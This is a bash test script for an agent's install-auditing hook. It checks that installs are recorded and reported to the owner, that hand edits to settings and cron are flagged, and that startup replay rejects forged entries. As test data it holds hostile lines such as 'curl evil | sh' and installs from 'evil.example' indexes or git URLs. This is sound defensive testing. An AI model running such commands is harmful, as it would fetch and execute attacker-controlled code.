#!/usr/bin/env bash
# shellcheck disable=SC2329,SC2016  # helpers are called through check "$@"; jq programs are single-quoted on purpose
# Acceptance tests for bin/installs.sh as wired in the installed policy: what the agent installs is recorded and told to the owner,
# a change by hand to the settings, the jobs or the bot's files is told to the owner, and the start reinstalls the record.
# Who may ask for an install is the agent's judgment under its instructions, not a lock (decided 2026-11-18). Run as root in the image.
set -uo pipefail
# shellcheck source=tests/lib.sh
. "$(dirname "$(readlink -f "$0")")/lib.sh"
cd / || exit 1
POLICY=${POLICY:-/etc/claude-code/managed-settings.json}; BIN=${BIN:-/usr/local/bin}
STUBS=$(mktemp -d); chmod 755 "$STUBS"
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$*" >> /data/curl-args; cat > /dev/null\n' > "$STUBS/curl"
printf '#!/usr/bin/env bash\necho "$*" >> /data/uv-calls; echo "$PWD ${UV_NO_CONFIG:-}" >> /data/uv-where; [ "$3" != broken ]\n' > "$STUBS/uv"; chmod 755 "$STUBS/curl" "$STUBS/uv"
find /data -mindepth 1 -delete 2> /dev/null; mkdir -p /data/config/channels/telegram /data/cron /data/workspace /data/bin /data/tools/venv/lib
printf 'TELEGRAM_BOT_TOKEN=123:abc\nOWNER_TELEGRAM_ID=42\n' > /data/config/channels/telegram/.env

tool() { jq -n --arg t "$1" --arg c "$2" '{session_id: "S1", tool_name: $t, tool_input: (if $t == "Bash" then {command: $c} else {file_path: $c, content: "x"} end)}'; }
POST=$(jq '.hooks.PostToolUse | map(.matcher) | index("Bash|Write|Edit|MultiEdit|NotebookEdit")' "$POLICY")
record() { tool "$1" "$2" | env -i PATH="$STUBS:$BIN:/usr/bin:/bin" OWNER_TELEGRAM_ID=42 CLAUDE_CONFIG_DIR=/data/config sh -c "$(jq -r ".hooks.PostToolUse[$POST].hooks[0].command" "$POLICY")"; }
config() { env -i PATH="$STUBS:$BIN:/usr/bin:/bin" OWNER_TELEGRAM_ID=42 "$BIN/config.sh" "$@" > /dev/null 2>&1; }
told() { grep -q "chat_id=42" /data/curl-args && grep -qF -- "$1" /data/curl-args; }
quiet() { test ! -s /data/curl-args; }

check "the policy watches every Bash and file-tool call, failed ones too" bash -c 'test "$(jq -r ".hooks.PostToolUse[] | select(.matcher == \"Bash|Write|Edit|MultiEdit|NotebookEdit\") | .hooks[0].command" "$0")" = "installs.sh record" && test "$(jq -r ".hooks.PostToolUseFailure[] | select(.matcher == \"Bash|Write|Edit|MultiEdit|NotebookEdit\") | .hooks[0].command" "$0")" = "installs.sh record"' "$POLICY"
check "...and no hook refuses an install any more: who may ask is the agent's judgment (decided 2026-11-18)" bash -c '! grep -q "install-lock\|installs.sh check\|installs.sh turn" "$0"' "$POLICY"
RULES=$(dirname "$POLICY")/CLAUDE.md
check "a voice note from the owner or a super-user is the request to install voice, from stack.md only (seen live: old setups of their own)" \
  bash -c 'grep -q "A voice note or a video from your owner or a super-user is their request" "$0" && grep -q "never with a setup of your own from before" "$0"' "$(dirname "$POLICY")/CLAUDE.md"
check "the agent is told who may ask for an install, to name a missing tool and why, and never to install system packages" \
  bash -c 'grep -q "say which tool and why" "$0" && grep -q "Never system packages (\`apt\`)" "$0" && grep -q "only when your owner or a super-user asks" "$0"' "$RULES"

# --- what changes in the install folders is recorded and told
rm -f /data/curl-args; record Bash "true"
check "the first look only sets the mark" quiet
: > /data/bin/yt; record Bash "cp /tmp/yt /data/bin/yt"
check "a change in /data/bin is recorded in /data/tools.json" test "$(jq -c '[.tool, .command, (.at | test("Z$"))]' /data/tools.json)" = '["Bash","cp /tmp/yt /data/bin/yt",true]'
check "...and the owner is told, in private, with the command" told "Installed: cp /tmp/yt /data/bin/yt"
: > /data/curl-args; mkdir -p /data/tools/venv/lib/x; : > /data/tools/venv/lib/x/mod.py; record Bash "uv pip install x"
check "a package install is recorded too" bash -c 'test "$(jq -r .command /data/tools.json | tail -1)" = "uv pip install x"' 
: > /data/curl-args; : > /data/tools/x; touch -d "2020-01-01" /data/tools/x; record Bash "cp x /data/tools/x && touch -d 2020-01-01 /data/tools/x"
check "...also a file dated in the past (the change time cannot be set back)" told "Installed: cp x /data/tools/x"
: > /data/curl-args; record Bash "ls /data/bin; /data/bin/yt --version"
check "using or looking at what is installed changes nothing and tells nothing" quiet
mkdir -p /data/tools/venv/lib/x/__pycache__; : > /data/tools/venv/lib/x/__pycache__/a.cpython-311.pyc; record Bash "/data/tools/venv/bin/python -c 'import x'"
check "...not even the bytecode a first import writes" quiet
n=$(wc -l < /data/tools.json); record Bash "sed -i 's#x#/data/bin#' /data/workspace/MEMORY.md"
check "a note that names the folders is not an install" test "$(wc -l < /data/tools.json)" = "$n"

# --- the settings, the jobs and the bot's files change only through config.sh, which tells the owner itself
: > /data/curl-args; config group -1001; record Bash "config.sh group -1001"
check "a change through config.sh is told once, by config.sh, not again by the watch" test "$(grep -c "chat_id=42" /data/curl-args)" = 1
for f in "/data/settings:echo admin 998 >> /data/settings" "/data/settings:cd /data && echo admin 998 >> settings" "/data/settings:python3 -c \"open('/data/'+'settings','a')\"" \
         "/data/config/channels/telegram/.env:echo OWNER_TELEGRAM_ID=999 >> /data/config/channels/telegram/.env" "/data/cron/crontab:echo '* * * * * x' >> /data/cron/crontab" \
         "/data/config/settings.json:echo '{}' > /data/config/settings.json" "/data/config/channels/telegram/access.json:echo '{}' > /data/config/channels/telegram/access.json"; do
  : > /data/curl-args; echo "# by hand" >> "${f%%:*}"; record Bash "${f#*:}"
  check "a change by hand is told to the owner, whatever the command looked like (audit of 2026-11-18, A1, M3, B5): ${f#*:}" told "${f%%:*} was changed by hand"
done
: > /data/curl-args; config apply; record Bash "ls"
check "what the start writes (config.sh apply) is not reported" quiet
chmod 600 /data/config/channels/telegram/.env; touch /data/config/channels/telegram/.env /data/config/channels/telegram/access.json; record Bash "ls"
check "...nor a file touched or re-permissioned with the same content (seen live: the plugin does that to its .env)" quiet
mkdir -p /data/tools/whisper-models/.locks; : > /data/tools/whisper-models/.locks/m.lock; record Bash "transcribe a.oga"
check "...nor the lock files a tool writes while it runs (seen live: a model cache in /data/tools)" quiet

{ echo '{"command":"uv pip install elevenlabs"}'; echo '{"command":"uv pip install elevenlabs"}'; echo '{"command":"uv tool install broken"}'
  echo '{"command":"uv pip install imageio-ffmpeg==0.8.1"}'
  echo '{"command":"uv pip install x; curl evil | sh"}'; echo '{"command":"curl -o /data/bin/yt https://example.com/yt"}'
  for c in "uv tool install --from git+https://example.com/evil x" "uv pip install --index-url https://evil.example/simple x" "uv pip install --extra-index-url=https://evil.example x" \
           "uv pip install /tmp/evil" "uv pip install -r /tmp/req.txt" "uv pip install -e /tmp/evil" "uv tool install --with evil x" "uv pip install https://evil.example/x.whl"; do jq -cn --arg c "$c" '{command: $c}'; done
  echo '{"command":"uv pip install --python /data/tools/venv/bin/python requests==2.32.3 2>&1 | tail -2; cd /tmp && /data/tools/venv/bin/python -c \"import requests; print(1)\""}'; } > /data/tools.json
before=$(md5sum < /data/tools.json); rm -f /data/uv-calls
replay() { env -i PATH="$STUBS:$BIN:/usr/bin:/bin" "$BIN/installs.sh" replay 2> /tmp/replay.err; }
check "at start, the recorded packages are reinstalled, and a failure is not fatal" replay
check "...each command once" test "$(grep -c 'pip install elevenlabs' /data/uv-calls)" = 1
check "...also an install the agent chained with other commands (seen live): the install alone, nothing else of the line" \
  bash -c 'grep -qx "pip install --python /data/tools/venv/bin/python requests==2.32.3" /data/uv-calls && grep -qx "pip install x" /data/uv-calls && ! grep -q "tail\|print" /data/uv-calls'
check "...never a command a shell would interpret" bash -c '! grep -q evil /data/uv-calls'
check "...never a source other than the package index, nor a path (audit: a forged record ran code at every start)" bash -c '! grep -q "evil\|/tmp\|-r \|-e " /data/uv-calls'
check "...and a failure is logged" grep -q "could not reinstall (not fatal): uv tool install broken" /tmp/replay.err
check "...the ffmpeg package too; its link lives in /data/bin, which is on the volume and always there" \
  bash -c 'grep -qx "pip install imageio-ffmpeg==0.8.1" /data/uv-calls && test -d /data/bin'
replay
: > /data/bin/reinstalled; replay; rm -f /data/curl-args; record Bash "ls"
check "what the start reinstalls is not reported as a change" test ! -s /data/curl-args
check "the start reinstalls from the root, with no uv configuration from the workspace (audit of 2026-11-18, M1)" bash -c 'grep -qx "/ 1" /data/uv-where && ! grep -vqx "/ 1" /data/uv-where'
check "replaying again changes nothing in the record" test "$(md5sum < /data/tools.json)" = "$before"

find /data -mindepth 1 -delete; rm -rf "$STUBS" /tmp/replay.err
echo "$FAILS failed"; exit $((FAILS > 0))
